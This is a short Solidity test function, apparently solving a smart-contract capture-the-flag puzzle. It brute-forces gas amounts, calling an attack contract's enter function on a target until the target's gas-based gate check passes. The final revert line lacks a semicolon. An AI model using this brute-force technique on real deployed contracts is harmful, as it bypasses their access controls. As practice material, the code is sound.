function test() public {
    for (uint256 i = 100; i < 8191; i++){
        try attack.enter(address(target), i ) {
            console.log("gas", i);
            return;
        } catch{}
    }
    revert("No luck")
}
